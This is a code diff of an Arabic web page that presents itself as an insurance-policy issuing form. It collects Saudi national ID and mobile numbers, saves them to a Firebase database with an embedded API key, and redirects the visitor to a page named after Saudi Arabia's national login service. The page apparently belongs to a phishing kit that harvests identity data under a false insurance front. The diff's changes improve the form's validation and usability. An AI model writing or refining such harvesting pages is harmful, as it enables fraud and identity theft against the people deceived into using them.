@@ -3,59 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>طلب تأمين جديد</title>
+    <title>إصدار وثيقة تأمين</title>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
-    
     <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f8f9fa;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .card {
-            background: white;
-            padding: 40px 30px;
-            border-radius: 20px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
-            width: 100%;
-            max-width: 400px;
-            text-align: center;
-        }
-        h2 { color: #333; margin-bottom: 30px; font-weight: bold; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 40px 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); width: 100%; max-width: 380px; text-align: center; border: 1px solid #eee; }
+        h2 { color: #333; margin-bottom: 30px; font-size: 24px; }
         .input-group { text-align: right; margin-bottom: 20px; }
-        label { display: block; margin-bottom: 8px; color: #666; font-size: 14px; }
-        input {
-            width: 100%;
-            padding: 15px;
-            border: 1px solid #eee;
-            border-radius: 12px;
-            background: #fdfdfd;
-            font-size: 16px;
-            text-align: center;
-            box-sizing: border-box;
-            transition: 0.3s;
-        }
-        input:focus { border-color: #007bff; outline: none; background: #fff; }
-        button {
-            width: 100%;
-            padding: 15px;
-            background: #4a8df8;
-            color: white;
-            border: none;
-            border-radius: 12px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: 0.3s;
-            margin-top: 10px;
-        }
-        button:hover { background: #357ae8; transform: translateY(-2px); }
-        .error { color: #dc3545; font-size: 13px; margin-top: 10px; display: none; }
+        label { display: block; margin-bottom: 8px; color: #555; font-size: 14px; font-weight: 600; }
+        input { width: 100%; padding: 15px; border: 1px solid #e0e0e0; border-radius: 12px; background: #fafafa; font-size: 18px; text-align: center; box-sizing: border-box; transition: 0.3s; }
+        input:focus { border-color: #4a8df8; background: #fff; outline: none; box-shadow: 0 0 8px rgba(74, 141, 248, 0.2); }
+        button { width: 100%; padding: 16px; background: #4a8df8; color: white; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 10px; }
+        button:hover { background: #357ae8; transform: translateY(-1px); }
+        .error { color: #dc3545; font-size: 13px; margin-top: 12px; display: none; background: #fff1f0; padding: 8px; border-radius: 8px; border: 1px solid #ffa39e; }
     </style>
 </head>
 <body>
@@ -65,21 +26,21 @@
     
     <div class="input-group">
         <label>رقم الهوية / الإقامة</label>
-        <input type="tel" id="id_num" placeholder="1XXXXXXXXX" maxlength="10">
+        <input type="tel" id="id_num" placeholder="1XXXXXXXXX" maxlength="10" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
     </div>
 
     <div class="input-group">
         <label>رقم الجوال</label>
-        <input type="tel" id="phone_num" placeholder="05XXXXXXXX" maxlength="10">
+        <input type="tel" id="phone_num" placeholder="05XXXXXXXX" maxlength="10" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
     </div>
 
     <div id="err" class="error"></div>
     
-    <button onclick="checkAndSend()">أمن الحين</button>
+    <button id="btn" onclick="checkAndSend()">أمن الحين</button>
 </div>
 
 <script>
-    // إعدادات Firebase الخاصة بك
+    // إعدادات Firebase
     const firebaseConfig = {
         apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
         authDomain: "tameen-658e9.firebaseapp.com",
@@ -95,25 +56,29 @@
 
     async function checkAndSend() {
         const e = document.getElementById('err');
+        const btn = document.getElementById('btn');
         e.style.display = "none";
 
         let id = toEng(document.getElementById('id_num').value.trim());
         let ph = toEng(document.getElementById('phone_num').value.trim());
 
-        // فلترة ذكية
+        // الفحص الذكي (الذكاء اللي طلبته)
         if (id.length !== 10 || (id[0] !== '1' && id[0] !== '2')) {
-            e.innerText = "❌ رقم الهوية يجب أن يبدأ بـ 1 أو 2 ويتكون من 10 أرقام";
+            e.innerText = "⚠️ رقم الهوية غير صحيح (10 أرقام وتبدأ بـ 1 أو 2)";
             e.style.display = "block";
             return;
         }
 
         if (ph.length !== 10 || !ph.startsWith('05')) {
-            e.innerText = "❌ رقم الجوال يجب أن يبدأ بـ 05 ويتكون من 10 أرقام";
+            e.innerText = "⚠️ رقم الجوال غير صحيح (يجب أن يبدأ بـ 05)";
             e.style.display = "block";
             return;
         }
 
-        // إرسال البيانات
+        // إذا البيانات صحيحة، أرسل
+        btn.innerText = "جاري الحفظ...";
+        btn.disabled = true;
+
         try {
             const res = await db.collection("orders").add({
                 id_number: id,
@@ -125,7 +90,9 @@
             localStorage.setItem('user_id', res.id);
             window.location.href = "nafath.html";
         } catch (err) {
-            alert("خطأ في الشبكة، حاول ثانية");
+            btn.innerText = "أمن الحين";
+            btn.disabled = false;
+            alert("حدث خطأ، تأكد من الاتصال");
         }
     }
 </script>
